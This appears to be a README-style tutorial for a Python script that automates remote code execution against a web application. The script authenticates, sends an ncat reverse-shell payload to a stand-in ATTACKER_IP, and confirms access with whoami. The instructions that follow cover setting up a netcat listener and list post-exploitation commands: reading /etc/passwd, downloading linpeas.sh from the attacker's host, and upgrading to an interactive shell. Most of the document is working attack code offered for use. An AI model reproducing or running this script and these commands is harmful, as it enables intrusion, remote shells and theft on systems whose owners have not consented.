# Automated RCE Exploitation with Persistence
This Python script is designed to automate common steps in Remote Code Execution (RCE) exploitation, including authentication to a target web application and the ability to send commands and initiate a reverse shell. It aims to maintain persistence by re-authenticating if the session expires.

Create a file named `automated_rce.py` and add the following content:
```python
#!/usr/bin/python3

import requests
from colorama import Fore, Style # Added Style for good practice
import pyfiglet

font = pyfiglet.figlet_format('Auto-Exploit')
print(Fore.CYAN + font + Style.RESET_ALL) # Added Style.RESET_ALL

login_url = "http://example.com/login.php"
execute_url = "http://example.com/dashboard.php"
username = "USERNAME"
password = "PASSWORD"
attacker_ip = "ATTACKER_IP"
attacker_port = "PORT_NUMBERS"

def authenticate():
    session = requests.Session()
    response = session.post(login_url, data={'username':username, 'password':password})

    if "Welcome" in response.text:
        print("[+] Authentication successful.")
        return session
    else: # It's good practice to handle the failure case explicitly
        print("[-] Authentication failed.")
        return None # Return None if authentication fails

def execute_command(session, command):
    # This function needs to handle the case where session might be None
    if not session:
        print("[-] Cannot execute command: Session is not authenticated.")
        return

    response = session.post(execute_url, data={"cmd": command})
    # The re-authentication logic inside execute_command might be problematic.
    # It's better to handle session expiration where execute_command is called.
    # For now, let's simplify for the immediate error fix.
    print(f"[+] Output:\n{response.text}")


def get_reverse_shell(session, attacker_ip, attacker_port):
    if not session:
        print("[-] Cannot get reverse shell: Session is not authenticated.")
        return

    payload = f"ncat {attacker_ip} {attacker_port} -e /bin/bash"
    print(f"[+] Attempting to send reverse shell payload: {payload}")
    execute_command(session, payload)

    # The re-authentication here is redundant and problematic.
    # If the initial call to execute_command with the payload worked,
    # then 'whoami' should also work. If the session expired,
    # the calling code (main part) should re-authenticate.
    # Let's remove the redundant authentication call here for now.
    # if session: # This 'if session' check is not for re-authentication, but for initial success
    #     execute_command(session, "whoami")
    print("[+] If successful, check your netcat listener for a shell.")
    execute_command(session, "whoami") # Execute whoami to confirm if shell is active (optional)


# --- Main execution flow ---
print("[*] Attempting to authenticate...")
session = authenticate() # Call authenticate and store the session

if session: # Only proceed if authentication was successful
    print("[*] Authentication successful. Attempting to get reverse shell...")
    get_reverse_shell(session, attacker_ip, attacker_port)
else:
    print("[-] Failed to authenticate. Exiting.")
```

### Before Running: Set up a Listener
Before executing `automad-rce.py` to get a reverse shell, you must set up a Netcat listener on your attacking machine (your local machine) to catch the incoming connection from the target.

Open a new terminal on your machine and run:
```bash
$ nc -lvnp <PORT_NUMBERS>
```
Replace `<PORT_NUMBERS>` with the same port number you specified for attacker_port in the script (4444). This command sets up a Netcat listener that is verbose (`-v`), listens (`-l`), specifies a port (`-p`), and does not do DNS lookups (`-n`).

### How to Run the Script
Execute the script from your terminal:
```bash
$ python3 automated_rce.py
```

Alternatively, you can make the script executable and run it directly:
```bash
$ chmod +x automated_rce.py
$ ./automated_rce.py
```
Remember to modify the configuration variables (`login_url`, `execute_url`, `username`, `password`, `attacker_ip`, `attacker_port`) within the `automated_rce.py` script before running it.

### Common Linux RCE Commands
Here are some common commands you might use once you have RCE on a Linux target:
- `whoami`: Displays the user currently executing the command.
- `pwd`: Prints the current working directory.
- `id`: Shows user and group IDs.
- `uname -a`: Prints detailed system information (kernel version, OS type, etc.).
- `cat /etc/passwd`: Reads the systemâ€™s password file (if permissions allow), often used to enumerate users.
- `ls -la`: Lists files and directories with detailed permissions and ownership.
- `wget http://<attacker-ip>/linpeas.sh`: Downloads a script (e.g., linpeas.sh for Linux privilege escalation enumeration) from your attacker machine.
- `python3 -c 'import pty; pty.spawn("/bin/bash")'`: Upgrades a simple shell to a fully interactive TTY shell, which is more convenient for navigating and executing complex commands.